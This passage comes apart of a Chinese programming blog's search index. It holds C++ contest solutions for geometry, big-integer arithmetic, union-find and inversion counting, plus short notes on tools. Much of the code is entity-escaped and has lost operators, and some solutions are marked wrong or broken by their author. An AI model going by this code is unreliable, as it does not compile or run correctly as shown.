1;i &lt;= n;i++) if(inter(line[2i-1],Line(Point(0,5),Point(10,5))) == false &amp;&amp; inter(line[2i],Line(Point(0,5),Point(10,5))) == false) flag = false; if(flag)dis[0][4n+1] = dis[4n+1][0] = 10; for(int k = 0;k &lt;= 4n+1;k++) for(int i = 0;i &lt;= 4n+1;i++) for(int j = 0;j &lt;= 4n+1;j++) if(dis[i][k] + dis[k][j] &lt; dis[i][j]) dis[i][j] = dis[i][k] + dis[k][j]; printf(&quot;%.2lf\\n&quot;,dis[0][4*n+1]); } return 0; }[/code]","link":"/posts/f0933eb4/"},{"title":"POJ1584-A Round Peg in a Ground Hole - ζёСяêτ - 小優YoU - 博客频道 - CSDN NET","text":"POJ1584-A Round Peg in a Ground Hole - ζёСяêτ - 小優YoU - 博客频道 - CSDN.NET. 转载请注明出处：優YoU http://user.qzone.qq.com/289065406/blog/1309142308 [code lang=”cpp”]//Memory Time//268K 0MS #include&lt;iostream&gt; #include&lt;cmath&gt;using namespace std; const double eps=1e-6;const double pi=3.141592654; typedef class NODE{ public: double x,y;}pos; int n;double PegR; //钉子半径pos Peg; //钉子坐标 int precision(double x); //精度讨论double det(double x1,double y1,double x2,double y2); //叉积double dotdet(double x1,double y1,double x2,double y2); //点积double cross(pos A,pos B,pos C,pos D);double distant(pos A,pos B); //计算距离double angle(pos A,pos B,pos P); //计算向量PA与PB夹角 bool IsConvexBag(pos Vectex); //判断输入的点集是否为凸包(本题保证了输入的点集为按某一时针方向有序)bool IsIn(pos Vectex); //判断圆心是否在多边形内部bool IsFit(pos* Vectex); //判断圆的半径是否&lt;=其圆心到多边形所有边的最小距离 int main(void){ while(cin&gt;&gt;n &amp;&amp; n&gt;=3) { cin&gt;&gt;PegR&gt;&gt;Peg.x&gt;&gt;Peg.y; pos* Vectex=new pos[n+2]; //多边形顶点坐标 for(int i=1;i&amp;lt;=n;i++) cin&amp;gt;&amp;gt;Vectex[i].x&amp;gt;&amp;gt;Vectex[i].y; Vectex[0].x=Vectex[n].x; //封闭多边形 Vectex[0].y=Vectex[n].y; Vectex[n+1].x=Vectex[1].x; Vectex[n+1].y=Vectex[1].y; if(!IsConvexBag(Vectex)) cout&amp;lt;&amp;lt;&amp;quot;HOLE IS ILL-FORMED&amp;quot;&amp;lt;&amp;lt;endl; else { bool flag1=IsIn(Vectex); bool flag2=IsFit(Vectex); if(flag1 &amp;amp;&amp;amp; flag2) cout&amp;lt;&amp;lt;&amp;quot;PEG WILL FIT&amp;quot;&amp;lt;&amp;lt;endl; else cout&amp;lt;&amp;lt;&amp;quot;PEG WILL NOT FIT&amp;quot;&amp;lt;&amp;lt;endl; } delete Vectex; } return 0; } /精度讨论/int precision(double x){ if(fabs(x)&lt;=eps) return 0; return x&gt;0?1:-1;} /计算点积/double dotdet(double x1,double y1,double x2,double y2){ return x1x2+y1y2;} /计算叉积/double det(double x1,double y1,double x2,double y2){ return x1y2-x2y1;}double cross(pos A,pos B,pos C,pos D){ return det(B.x-A.x , B.y-A.y , D.x-C.x , D.y-C.y);} /计算距离/double distant(pos A,pos B){ return sqrt((B.x-A.x)(B.x-A.x)+(B.y-A.y)(B.y-A.y));} /计算角度/double angle(pos A,pos B,pos P){ return acos(dotdet(A.x-P.x,A.y-P.y,B.x-P.x,B.y-P.y)/(distant(A,P)*distant(B,P)));} /凸包判断/bool IsConvexBag(pos* Vectex){ int direction=0; //保存点集Vectex的旋转方向direction 1:右手正螺旋，逆时针 -1:左手正螺旋，顺时针 for(int i=0;i&lt;=n-1;i++) { int temp=precision(cross(Vectex[i],Vectex[i+1],Vectex[i+1],Vectex[i+2])); if(!direction) //避免最初的点出现共线的情况 direction=temp; if(direction*temp&amp;lt;0) //只要Vectex是凸包，那么无论Vectex的旋转方向如何，direction*temp都会&amp;gt;=0 return false; } return true; } /判断点与多边形的关系/bool IsIn(pos* Vectex){ double CircleAngle=0.0; //环绕角 for(int i=1;i&lt;=n;i++) //注意重复边不计算 if(precision(cross(Peg,Vectex[i],Peg,Vectex[i+1]))&gt;=0) CircleAngle+=angle(Vectex[i],Vectex[i+1],Peg); else CircleAngle-=angle(Vectex[i],Vectex[i+1],Peg); if(precision(CircleAngle)==0) //CircleAngle=0, Peg在多边形外部 return false; else if(precision(CircleAngle-pi)==0 || precision(CircleAngle+pi)==0) //CircleAngle=180, Peg在多边形边上(不包括顶点) { if(precision(PegR)==0) return true; } else if(precision(CircleAngle-2*pi)==0 || precision(CircleAngle+2*pi)==0) //CircleAngle=360, Peg在多边形边内部 return true; else //CircleAngle=(0,360)之间的任意角， Peg在多边形顶点上 { if(precision(PegR)==0) return true; } return false; } /判断圆与多边形的关系/bool IsFit(pos* Vectex){ for(int i=0;i&lt;=n;i++) { int k=precision(fabs(cross(Peg,Vectex[i],Peg,Vectex[i+1])/distant(Vectex[i],Vectex[i+1]))-PegR); if(k&lt;0) return false; } return true; }[/code]","link":"/posts/c3ab0a9d/"},{"title":"CharacterGraph - Intro","text":"semprathlon/CharacterGraph. &nbsp; This Android Project is intended for an Android application to be developed, which enables mutual conversion between a picture and a matrix of characters.","link":"/posts/c7a576c0/"},{"title":"寒假研究图片转文字真痛苦","text":"浏览Ascgen2的源代码，共有27000多行，翻了1W行还是未能确定关键环节——图片亮度与对比度的调整 &nbsp; https://github.com/semprathlon/CharacterGraph","link":"/posts/612b5339/"},{"title":"ZOJ3380- Patchouli&#39;s Spell Cards(概率DP+计数) - 推酷","text":"ZOJ3380- Patchouli's Spell Cards(概率DP+计数) - 推酷. Java的数据输入！ 在C++下反复调试高精度未果。现象：单精度必然WA，高精度往往TLE","link":"/posts/cd4cca96/"},{"title":"所以，Interface就是我学OOP的时候，被一而再再而三无视掉的东西","text":"请问高手,c++/vc怎么写接口(interface)!!!!!!!!!!!!-CSDN论坛-CSDN.NET-中国最大的IT技术社区. 从C++语言的角度来看，interface就是一个纯虚类，所以它定义的是一组方法的规范，作为接口实现者，必须从这个纯虚类继承一个class并实现所有要求的接口方法。例：以下是接口定义（C++语法）class Iface{public: virtual HRESULT stdcall method1(long) = 0; virtual HRESULT stdcall method2() = 0;};以下是接口实现class CIface : public Iface{public: virtual HRESULT stdcall method1(long a) { // do something return S_OK; } virtual HRESULT stdcall method2() { // do something return S_OK; }};","link":"/posts/3b89e735/"},{"title":"BigInteger从Java移植到cpp，自己写了两天，写崩了。。。","text":"自己的：[code lang=”cpp”]const int LEN=100;typedef struct HighPrecision{ short data[LEN],h; HighPrecision() { CLEAR(data); h=0; } HighPrecision(int n) { CLEAR(data); h=0; while(n&gt;0) data[h++]=n%10,n/=10; if(!data[h]) h–; } /HighPrecision(const HighPrecision &amp;a) { memcpy(data,a.data,sizeof(data)); h=a.h; }/ const HighPrecision &amp;operator= (int n) { CLEAR(data); h=0; while(n&gt;0) data[h++]=n%10,n/=10; if(!data[h]) h–; return this; } const HighPrecision &amp;operator= (const HighPrecision &amp;a) { memcpy(data,a.data,sizeof(data)); h=a.h; return this; } bool odd() { return data[0]&amp;1; } void output() { for(int i=h;i&gt;=0;i–) printf(&quot;%d&quot;,data[i]); }} BigInteger; bool operator&lt; (const BigInteger &amp;a,const BigInteger &amp;b){ if (a.h&lt;b.h) return 1; else if (a.h&gt;b.h) return 0; else { int h=b.h,k=0; for(int i=h;i&gt;=0;i–) if (a.data[i]!=b.data[i]) {k=i;break;} return a.data[k]&lt;b.data[k]; }} bool operator&lt; (const BigInteger &amp;a,int n){ return a&lt;BigInteger(n);} bool operator&gt; (const BigInteger &amp;a,const BigInteger &amp;b){ if (a.h&lt;b.h) return 0; else if (a.h&gt;b.h) return 1; else { int h=b.h,k=0; for(int i=h;i&gt;=0;i–) if (a.data[i]!=b.data[i]) {k=i;break;} return a.data[k]&gt;b.data[k]; }} bool operator&gt; (const BigInteger &amp;a,int n){ return a&gt;BigInteger(n);} bool operator== (const BigInteger &amp;a,const BigInteger &amp;b){ if (a.h!=b.h) return 0; else { int h=b.h,k=0; for(int i=h;i&gt;=0;i–) if (a.data[i]!=b.data[i]) {k=i;break;} return a.data[k]==b.data[k]; }} bool operator== (const BigInteger &amp;a,int n){ return a==BigInteger(n);} bool operator&gt;= (const BigInteger &amp;a,const BigInteger &amp;b){ return (a&gt;b)||(a==b);} BigInteger operator+(const BigInteger &amp;a,const BigInteger &amp;b){ BigInteger c; int h=max(a.h,b.h); for(int i=0;i&lt;=h;i++) { c.data[i]+=a.data[i]+b.data[i]; c.data[i+1]=c.data[i]/10; c.data[i]%=10; } while(c.data[c.h+1]&gt;0) c.h++; return c;} BigInteger operator+(const BigInteger &amp;a,int n){ return a+BigInteger(n);} BigInteger operator+= (const BigInteger &amp;a,const BigInteger &amp;b){ return a+b;} BigInteger operator-(const BigInteger &amp;a,const BigInteger &amp;b){ BigInteger c(a); int h=c.h; for(int i=0;i&lt;=c.h;i++) { c.data[i]-=b.data[i]; if (c.data[i]&lt;0) { c.data[i]+=10; c.data[i+1]–; } } while(c.data[c.h]&lt;1) c.h–; return c;} BigInteger operator-(const BigInteger &amp;a,int n){ return a-BigInteger(n);} BigInteger operator-= (const BigInteger &amp;a,const BigInteger &amp;b){ return a-b;} BigInteger operator (const BigInteger &amp;a,const BigInteger &amp;b){ BigInteger c; for(int i=0;i&lt;=a.h;i++) for(int j=0;j&lt;=b.h;j++) c.data[i+j-1]+=a.data[i]b.data[j]; int k=0; while(c.data[k++]&gt;0) { c.data[k+1]+=c.data[k]/10; c.data[k]%=10; } c.h=(k-1&gt;=0)?k-1:0; return c;} BigInteger operator= (const BigInteger &amp;a,const BigInteger &amp;b){ return ab;} BigInteger operator/ (const BigInteger &amp;a,const BigInteger &amp;b){ BigInteger c,tmp; int h=max(a.h,b.h); for( int i = h; i &gt;= 0; i– ){ tmp*= 10; tmp+= a.data[i]; while( tmp &gt;= b ) { tmp -= b; c.data[i]++; } } c.h=a.h; while(c.data[c.h]&lt;1) c.h–; return c;} BigInteger operator/ (const BigInteger &amp;a,int n){ return a/BigInteger(n);} BigInteger operator/= (const BigInteger &amp;a,const BigInteger &amp;b){ return a/b;} BigInteger operator% (const BigInteger &amp;a,const BigInteger &amp;b){ BigInteger c,tmp; int h=max(a.h,b.h); for( int i = h; i &gt;= 0; i– ){ tmp*= 10; tmp+= a.data[i]; while( tmp &gt;= b ) { tmp -= b; c.data[i]++; } } tmp.h=a.h; while(tmp.data[tmp.h]&lt;1) tmp.h–; return tmp;} BigInteger operator&gt;&gt;(const BigInteger &amp;a,int n){ BigInteger c(a); for (int i=1;i&lt;=n;i++) c=c/2; return c;}[/code] 别人的： http://blog.csdn.net/wall_f/article/details/8373395 &nbsp;[code lang=”cpp”]const int MAXN = 410; struct bign{ int len, s[MAXN]; bign () { memset(s, 0, sizeof(s)); len = 1; } bign (int num) { this = num; } bign (const char num) { this = num; } bign operator = (const int num) { char s[MAXN]; sprintf(s, &quot;%d&quot;, num); this = s; return this; } bign operator = (const char num) { for(int i = 0; num[i] == ‘0’; num++) ; //去前导0 len = strlen(num); for(int i = 0; i &lt; len; i++) s[i] = num[len-i-1] - ‘0’; return this; } bign operator + (const bign &amp;b) const //+ { bign c; c.len = 0; for(int i = 0, g = 0; g || i &lt; max(len, b.len); i++) { int x = g; if(i &lt; len) x += s[i]; if(i &lt; b.len) x += b.s[i]; c.s[c.len++] = x % 10; g = x / 10; } return c; } bign operator += (const bign &amp;b) { this = this + b; return this; } void clean() { while(len &gt; 1 &amp;&amp; !s[len-1]) len–; } bign operator (const bign &amp;b) // { bign c; c.len = len + b.len; for(int i = 0; i &lt; len; i++) { for(int j = 0; j &lt; b.len; j++) { c.s[i+j] += s[i] b.s[j]; } } for(int i = 0; i &lt; c.len; i++) { c.s[i+1] += c.s[i]/10; c.s[i] %= 10; } c.clean(); return c; } bign operator = (const bign &amp;b) { this = this b; return this; } bign operator - (const bign &amp;b) { bign c; c.len = 0; for(int i = 0, g = 0; i &lt; len; i++) { int x = s[i] - g; if(i &lt; b.len) x -= b.s[i]; if(x &gt;= 0) g = 0; else { g = 1; x += 10; } c.s[c.len++] = x; } c.clean(); return c; } bign operator -= (const bign &amp;b) { this = this - b; return this; } bign operator / (const bign &amp;b) { bign c, f = 0; for(int i = len-1; i &gt;= 0; i–) { f = f10; f.s[0] = s[i]; while(f &gt;= b) { f -= b; c.s[i]++; } } c.len = len; c.clean(); return c; } bign operator /= (const bign &amp;b) { this = this / b; return this; } bign operator % (const bign &amp;b) { bign r = this / b; r = this - rb; return r; } bign operator %= (const bign &amp;b) { this = this % b; return this; } bool operator &lt; (const bign &amp;b) { if(len != b.len) return len &lt; b.len; for(int i = len-1; i &gt;= 0; i–) { if(s[i] != b.s[i]) return s[i] &lt; b.s[i]; } return false; } bool operator &gt; (const bign &amp;b) { if(len != b.len) return len &gt; b.len; for(int i = len-1; i &gt;= 0; i–) { if(s[i] != b.s[i]) return s[i] &gt; b.s[i]; } return false; } bool operator == (const bign &amp;b) { return !(this &gt; b) &amp;&amp; !(this &lt; b); } bool operator != (const bign &amp;b) { return !(this == b); } bool operator &lt;= (const bign &amp;b) { return this &lt; b || this == b; } bool operator &gt;= (const bign &amp;b) { return this &gt; b || this == b; } string str() const { string res = &quot;&quot;; for(int i = 0; i &lt; len; i++) res = char(s[i]+’0’) + res; return res; }}; istream&amp; operator &gt;&gt; (istream &amp;in, bign &amp;x){ string s; in &gt;&gt; s; x = s.c_str(); return in;} ostream&amp; operator &lt;&lt; (ostream &amp;out, const bign &amp;x){ out &lt;&lt; x.str(); return out;} int main(){ bign a, b, c, d, e, f, g; while(cin&gt;&gt;a&gt;&gt;b) { a.clean(), b.clean(); c = a+b; d = a-b; e = ab; f = a/b; g = a%b; cout&lt;&lt;&quot;a+b&quot;&lt;&lt;&quot;=&quot;&lt;&lt;c&lt;&lt;endl; // a += b cout&lt;&lt;&quot;a-b&quot;&lt;&lt;&quot;=&quot;&lt;&lt;d&lt;&lt;endl; // a -= b; cout&lt;&lt;&quot;ab&quot;&lt;&lt;&quot;=&quot;&lt;&lt;e&lt;&lt;endl; // a *= b; cout&lt;&lt;&quot;a/b&quot;&lt;&lt;&quot;=&quot;&lt;&lt;f&lt;&lt;endl; // a /= b; cout&lt;&lt;&quot;a%b&quot;&lt;&lt;&quot;=&quot;&lt;&lt;g&lt;&lt;endl; // a %= b; if(a != b) printf(&quot;YES\\n&quot;); else printf(&quot;NO\\n&quot;); } return 0;} [/code]","link":"/posts/4d27eeab/"},{"title":"在学校机房电脑发现了Microsoft Windows SDK v6 0A","text":"大概是为win32编程准备的。。。开始菜单项含有： GUID生成器 IL反汇编程序 manifest generator OLE-COM Object Viewer WinDiff Windows 资源本地化编辑器 安装Microsoft FXCop 服务跟踪查看器 服务配置编辑器 合成日志查看器 清单生成和编辑工具有几样正是我经常听说却没有认真学习的旧名词","link":"/posts/92b26415/"},{"title":"【GDUT-ACM】水题差点写跪了，囧","text":"Problem B: 神奇的编码 Description 假如没有阿拉伯数字，我们要怎么表示数字呢小明想了一个方法如下：1 -&gt; A2 -&gt; B3 -&gt; C….25 -&gt; Y26 -&gt; Z27 -&gt; AA28 -&gt; AB….现在请你写一个程序完成这个转换Input输入的第一个数为一个正整数T,表明接下来有T组数据。每组数据为一个正整数n ( n &lt;= 1000)Output对于每个正整数n,输出他对应的字符串Sample Input311027Sample OutputAJAA 没什么神奇的，本质还是进制转换 心急如焚之时，代码风格无比混乱；那个26的倍数的特殊处理，是个大痛点，AC一次耗时25min[code lang=”cpp”] #include&lt;cctype&gt; #include&lt;cmath&gt; #include&lt;cstdio&gt; #include&lt;cstring&gt; #include&lt;algorithm&gt; #include&lt;iostream&gt; #include&lt;string&gt; #include&lt;queue&gt; #include&lt;stack&gt; #include&lt;set&gt; #include&lt;map&gt; #define CLEAR(a) memset((a),0,sizeof((a))) using namespace std; typedef long long LL;const double pi = acos(-1.0);const int maxn=1e4;const int inf=99999999;const double eps=1e-3; int n; void init();void solve();void outp(); int main(){ int T; scanf(&quot;%d&quot;,&amp;T); while(T–) { string str; scanf(&quot;%d&quot;,&amp;n); //n+=(n-1)/26; //n++; //if (n%26==0) n–; while(n) { char ch=(n%26)?n%26+’A’-1:(n–,’Z’); str=ch+str; n/=26; } printf(&quot;%s&quot;,str.c_str()); puts(&quot;&quot;); } return 0;} void solve(){} void init(){ for(int i=1;i&lt;=n;i++) { } } void outp(){ printf(&quot;\\n&quot;);} /** Problem: 1112 User: semprathlon Language: C++ Result: Accepted Time:0 ms Memory:1484 kb**/[/code] =======================分隔符============================== 题E自我感觉正确，可是未能在结束前提交。。[code lang=”cpp”]int n; char* solve(double v,double d); int main(){ int T; scanf(&quot;%d&quot;,&amp;T); while(T–) { double v,d; scanf(&quot;%lf%lf&quot;,&amp;v,&amp;d); puts(solve(v,d)); } return 0;} char solve(double v,double d){ return (char)(((vvsqrt(2.0))/10.0-d&gt;eps)?&quot;Fire&quot;:&quot;Retreat&quot;);}[/code] 题A耗时16min，循环队列，简直没有TLE/MLE的理由[code lang=”cpp”]int n;int que[maxsize],h,r; int EnQ(int id){ if ((r+1)%maxsize!=h) { r=(r+1)%maxsize; que[r]=id; return 0; } else return -1;} int DeQ(){ if (h!=r) { int t=h; h=(h+1)%maxsize; return que[t]; } else return -1;} int Query(int k){ if (h==r) return -1; int t=(h&lt;=r)?r-h:maxsize-r+h; return (t&gt;=k)?que[(h+k)%maxsize]:-1;} int main(){ int T; scanf(&quot;%d&quot;,&amp;T); while(T–) { CLEAR(que);h=r=0; int cas,k; scanf(&quot;%d&quot;,&amp;n); for(int i=0;i&lt;n;i++) { scanf(&quot;%d&quot;,&amp;cas); switch(cas) { case 1:scanf(&quot;%d&quot;,&amp;k);EnQ(k);break; case 2:DeQ();break; case 3:scanf(&quot;%d&quot;,&amp;k); if (Query(k)&gt;=0) printf(&quot;%d\\n&quot;,Query(k)); else puts(&quot;na li you zhe me duo ren&quot;); break; } } } return 0;}[/code]","link":"/posts/346218b7/"},{"title":"【GDUT-ACM】大灌水","text":"难以容忍的两个WAProblem C[code lang=”cpp”]int main(){ int T,n,m; scanf(&quot;%d&quot;,&amp;T); while(T–) { priority_queue&lt;LL,vector&lt;LL&gt;,greater&lt;LL&gt; &gt; que; CLEAR(a); scanf(&quot;%d%d&quot;,&amp;n,&amp;m); for(int i=0;i&lt;n;i++) scanf(&quot;%lld&quot;,&amp;a[i]); sort(a,a+n); for(int i=1;i&lt;=m;i++) { que.push(a[n-i]); } LL ans=a[n-1]; for(int i=n-m-1;i&gt;=0;i–) { LL k=que.top(); que.pop(); que.push(k+a[i]); ans=max(ans,k+a[i]); } printf(&quot;%lld\\n&quot;,ans); } return 0;}[/code] Problem D[code lang=”cpp”] #include&lt;cctype&gt; #include&lt;cmath&gt; #include&lt;cstdio&gt; #include&lt;cstring&gt; #include&lt;algorithm&gt; #include&lt;iostream&gt; #include&lt;string&gt; #include&lt;queue&gt; #include&lt;stack&gt; #include&lt;set&gt; #include&lt;map&gt; #define CLEAR(a) memset((a),0,sizeof((a))) using namespace std; typedef long long LL;const double pi = acos(-1.0);const int maxn=2e5;const LL maxl=1e5+10;const int inf=99999999;const float eps=1e-3; LL a[maxn];bool vis[maxl];int n,m;vector&lt;LL&gt; vec; void init();void solve();void outp(); void get_prime(){ vec.clear(); CLEAR(vis); int k=0; for (int i = 2; i &lt; maxl;i++) if(!vis[i]) { k++; vec.push_back(i); for (int j = 1; i j &lt;= maxl; j++) { vis[i j] = 1; } }} int getfac(LL n){ if (n&lt;2) return 0; int h=0,res=0; while(h&lt;vec.size()) { if (n%vec[h]==0) res++; while (n%vec[h]==0) n/=vec[h]; h++; } return res;} LL pow2(LL n){ if (n&lt;=0) return 1; else if (n==1) return 2; else if (n&amp;1) { int k=pow2((n-1)&gt;&gt;1); return (kk)&lt;&lt;1; } else { int k=pow2(n&gt;&gt;1); return kk; }} int main(){ get_prime(); int T; LL n,m; scanf(&quot;%d&quot;,&amp;T); while(T–) { scanf(&quot;%lld%lld&quot;,&amp;n,&amp;m); if (m%n) {printf(&quot;0\\n&quot;);continue;} else if (n==1) {printf(&quot;1\\n&quot;);continue;} LL t=m/n; //printf(&quot;%d\\n&quot;,getfac(t)); LL ans=pow2(getfac(t)-1); printf(&quot;%lld\\n&quot;,ans); } return 0;} void solve(){} void init(){ } void outp(){ printf(&quot;\\n&quot;);} /** Problem: 1113 User: semprathlon Language: C++ Result: Wrong Answer**/[/code] =====================================Problem F罕见的PE，输出末尾不能有多余空格，防不胜防[code lang=”cpp”] #include&lt;cctype&gt; #include&lt;cmath&gt; #include&lt;cstdio&gt; #include&lt;cstring&gt; #include&lt;algorithm&gt; #include&lt;iostream&gt; #include&lt;string&gt; #include&lt;queue&gt; #include&lt;stack&gt; #include&lt;set&gt; #include&lt;map&gt; #define CLEAR(a) memset((a),0,sizeof((a))) using namespace std; typedef long long LL;const double pi = acos(-1.0);const int maxn=200;const int inf=99999999;const float eps=1e-3; int a[maxn]; void init();void solve();void outp(); int main(){ int T,n,m; scanf(&quot;%d&quot;,&amp;T); while(T–) { CLEAR(a); scanf(&quot;%d%d&quot;,&amp;n,&amp;m); int mina=inf,h=0; for(int i=0;i&lt;m;i++) { int k; scanf(&quot;%d&quot;,&amp;k); if (k&lt;mina) { mina=k; a[h++]=k; } } sort(a,a+h); int k=0; for(int i=1;i&lt;=n;i++) { if (k&lt;h-1&amp;&amp;a[k+1]&lt;=i) k++; if (i&lt;n) printf(&quot;%d &quot;,a[k]); else printf(&quot;%d&quot;,a[k]); } puts(&quot;&quot;); } return 0;} void solve(){} void init(){ } void outp(){ printf(&quot;\\n&quot;);} /** Problem: 1121 User: semprathlon Language: C++ Result: Accepted Time:0 ms Memory:1488 kb**/[/code] Problem G[code lang=”cpp”]int main(){ while(~scanf(&quot;%d&quot;,&amp;n)) { int k=n/3; printf(&quot;%d\\n&quot;,(n%3)?2k+n%3-1:2k); } return 0;}[/code] Problem E裸的并查集[code lang=”cpp”]const int maxn=2e5;const int inf=99999999;const float eps=1e-3; int f[maxn];int n,m; int getf(int n){ if (f[n]==n) return n; else return f[n]=getf(f[n]);} bool unite(int u,int v){ int x=getf(u); int y=getf(v); if (x!=y) { f[ y ]=x;return 1; } else return 0;} int main(){ int T,n,m; scanf(&quot;%d&quot;,&amp;T); while(T–) { CLEAR(f); scanf(&quot;%d%d&quot;,&amp;n,&amp;m); for(int i=1;i&lt;=n;i++) f[i]=i; for(int i=1;i&lt;=m;i++) { int u,v; scanf(&quot;%d%d&quot;,&amp;u,&amp;v); unite(u,v); } int ans=-1; for(int i=1;i&lt;=n;i++) if (f[i]==i) ans++; printf(&quot;%d\\n&quot;,ans); } return 0;} /** Problem: 1118 User: semprathlon Language: C++ Result: Accepted Time:264 ms Memory:2264 kb**/[/code] =====================还有个来不及提交的！［个人原因，15：26才加入比赛Problem H[code lang=”cpp”]const int maxn=2e4;const int inf=99999999;const float eps=1e-3;const pair&lt;int,int&gt; p0=make_pair(0,0); int a[maxn],f1[maxn],f2[maxn];pair&lt;int,int&gt; g1[maxn],g2[maxn]; void init();void solve();void outp(); int main(){ int T,n,m; scanf(&quot;%d&quot;,&amp;T); while(T–) { scanf(&quot;%d&quot;,&amp;n); CLEAR(a); CLEAR(f1); CLEAR(f2); CLEAR(g1); CLEAR(g2); scanf(&quot;%d&quot;,&amp;a[1]); f1[1]=f2[1]=0; g1[1]=g2[1]=p0; for(int i=2;i&lt;=n;i++) { scanf(&quot;%d&quot;,&amp;a[i]); if (f1[i-1]&lt;f2[i-1]) { g1[i]=make_pair(a[i],g1[i-1].second); g2[i]=make_pair(g1[i-1].first,a[i]); f1[i]=f1[i-1]+abs(a[i]-g1[i-1].first); f2[i]=f2[i-1]+abs(a[i]-g1[i-1].second); } else { g1[i]=make_pair(a[i],g2[i-1].second); g2[i]=make_pair(g2[i-1].first,a[i]); f1[i]=f1[i-1]+abs(a[i]-g2[i-1].first); f2[i]=f2[i-1]+abs(a[i]-g2[i-1].second); } } printf(&amp;quot;%d\\n&amp;quot;,min(f1[n],f2[n])); } } [/code]","link":"/posts/b298362f/"},{"title":"OOP outline","text":"抽象继承封装多态","link":"/posts/ce3b9412/"},{"title":"Mac OS 下怎样写作业","text":"我本以为 存在WPS office for Mac而不存在Microsoft office for Mac，真实情况正好相反…","link":"/posts/17dd5c95/"},{"title":"Win7自动更新坏了，引导Mac OS X的chameleon好了","text":"原来之前用ultraiso修改的wowpc.iso都是没用的，得用transMac改写hfs+文件才是","link":"/posts/7cdd2325/"},{"title":"FFZU-ACM月赛不行了","text":"线段树/树状数组的另一种用法不会，它的逆向问题更不会","link":"/posts/a2ddb966/"},{"title":"［心痛］线段树或树状数组求逆序数","text":"原文地址 线段树或树状数组求逆序数 求逆序数的方法有分治，归并，本文只介绍线段树或树状数组求逆序数的办法，众所周知，线段树和树状树可以用来解决区间操作问题，就是因为这两个算法区间操作的时间复杂度很低O(logN)，才让这种方法具有可行性。 首先先来看一个序列 6 1 2 7 3 4 8 5，此序列的逆序数为5+3+1=9。冒泡法可以直接枚举出逆序数，但是时间复杂度太高O(n^2)。冒泡排序的原理是枚举每一个数组，然后找出这个数后面有多少个数是小于这个数的，小于它逆序数+1。仔细想一下，如果我们不用枚举这个数后面的所有数，而是直接得到小于这个数的个数，那么效率将会大大提高。 总共有N个数，如何判断第i+1个数到最后一个数之间有多少个数小于第i个数呢？不妨假设有一个区间 [1,N]，只需要判断区间[i+1,N]之间有多少个数小于第i个数。如果我们把总区间初始化为0，然后把第i个数之前出现过的数都在相应的区间把它的值定为1，那么问题就转换成了[i+1,N]值的总和。再仔细想一下，区间[1,i]的值+区间[i+1,N]的值=区间[1,N]的值(i已经标记为1)，所以区间[i+1,N]值的总和等于N-[1,i]的值！因为总共有N个数，不是比它小就是比它(大或等于)。 现在问题已经转化成了区间问题，枚举每个数，然后查询这个数前面的区间值的总和， i-[1,i] 既为逆序数。 线段树预处理时间复杂度O(NlogN)，N次查询和N次插入的时间复杂度都为O(NlogN)，总的时间复杂度O(3*NlogN) 树状数组不用预处理，N次查询和N次插入的时间复杂度都为O(NlogN)，总的时间复杂度O(2*NlogN) 线段树:&nbsp;[code lang=”cpp”]// 线段树 #include &lt;stdio .h&gt; #include &lt;string .h&gt; #include &lt;stdlib .h&gt; #define MAX 51000 #define MID(a,b) (a+b)&gt;&gt;1 #define R(a) (a&lt; &amp;lt;1|1) #define L(a) a&lt;&amp;lt;1typedef struct { int num,left,right;}Node;int ans[MAX];Node Tree[MAX&lt;&amp;lt;2];int n; void Build(int t,int l,int r) //以1为根节点建立线段树{ int mid; Tree[t].left=l,Tree[t].right=r; if(Tree[t].left==Tree[t].right) { Tree[t].num=0; return ; } mid=MID(Tree[t].left,Tree[t].right); Build(L(t),l,mid); Build(R(t),mid+1,r);} void Insert(int t,int l,int r,int x) //向以1为根节点的区间[l,r]插入数字1{ int mid; if(Tree[t].left==l&amp;&amp;Tree[t].right==r) { Tree[t].num+=x; return ; } mid=MID(Tree[t].left,Tree[t].right); if(l&gt;mid) { Insert(R(t),l,r,x); } else if(r&lt; =mid) { Insert(L(t),l,r,x); } else { Insert(L(t),l,mid,x); Insert(R(t),mid+1,r,x); } Tree[t].num=Tree[L(t)].num+Tree[R(t)].num;} int Query(int t,int l,int r) //查询以1为根节点，区间[l,r]的和{ int mid; if(Tree[t].left==l&amp;&amp;Tree[t].right==r) return Tree[t].num; mid=MID(Tree[t].left,Tree[t].right); if(l&gt;mid) { return Query(R(t),l,r); } else if(r&lt;=mid) { return Query(L(t),l,r); } else { return Query(L(t),l,mid)+Query(R(t),mid+1,r); }} int main(){ int a,n,i,t; scanf(&quot;%d&quot;,&amp;t); long long int k; while(t–) { scanf(&quot;%d&quot;,&amp;n); memset(Tree,0,sizeof(Tree)); //初始化线段树 Build(1,1,n); for(i=1;i&lt;=n;i++) //输入n个数 { scanf(&quot;%d&quot;,&amp;ans[i]); } for(i=1,k=0;i&lt;=n;i++) { a=ans[i]; Insert(1,a,a,1); //把线段树[ans[i],ans[i]]区间的值插入为1 k=k+(i-Query(1,1,a)); //查询区间[1,ans[i]]值的总和,逆序数等于i-[1,ans[i]] } printf(&quot;%lld\\n&quot;,k); } return 0;}[/code] 树状数组:[code lang=”cpp”]// 树状数组 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;algorithm&gt;using namespace std; #define MAX 100010int c[MAX],a[MAX],ans[MAX],n; int Lowbit(int x) //返回二进制最后一个1所表示的数{ return x&amp;(-x);} void Updata(int x) //向前更新{ while(x&lt;=n) { c[x]++; x+=Lowbit(x); }} int Sum(int x) //向后更新求和{ int sum=0; while(x&gt;0) { sum+=c[x]; x-=Lowbit(x); } return sum;} int main(){ int i,t,k; scanf(&quot;%d&quot;,&amp;t); while(t–) { scanf(&quot;%d&quot;,&amp;n); for(i=1;i&lt;=n;i++) { scanf(&quot;%d&quot;,&amp;ans[i]); } memset(c,0,sizeof(c)); //初始化树状数组 for(i=1,k=0;i&lt;=n;i++) { Updata(ans[i]); //向后更新节点ans[i].k k=k+(i-Sum(ans[i])); //向前查询节点ans[i].k } printf(&quot;%d\\n&quot;,k); } return 0;}[/code]&nbsp;","link":"/posts/981b6222/"},{"title":"【转】Vim简明教程【CoolShell】 - 飘过的小牛 - 博客频道 - CSDN NET","text":"Vim简明教程【CoolShell】 - 飘过的小牛 - 博客频道 - CSDN.NET.","link":"/posts/6d1cacec/"},{"title":"iOS开发技巧- Code Snippet拖拽代码到你的工程 - TO_PERFECT - 博客频道 - CSDN NET","text":"iOS开发技巧- Code Snippet拖拽代码到你的工程 - TO_PERFECT - 博客频道 - 